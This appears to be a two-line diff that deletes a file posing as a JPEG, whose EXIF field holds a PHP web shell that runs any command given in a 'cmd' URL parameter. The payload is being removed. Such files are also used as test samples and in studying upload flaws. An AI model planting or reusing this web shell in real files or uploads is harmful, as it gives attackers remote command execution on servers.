@@ -1,2 +1,0 @@
-JPEGDATA
-EXIF: <?php system($_GET['cmd']); ?>
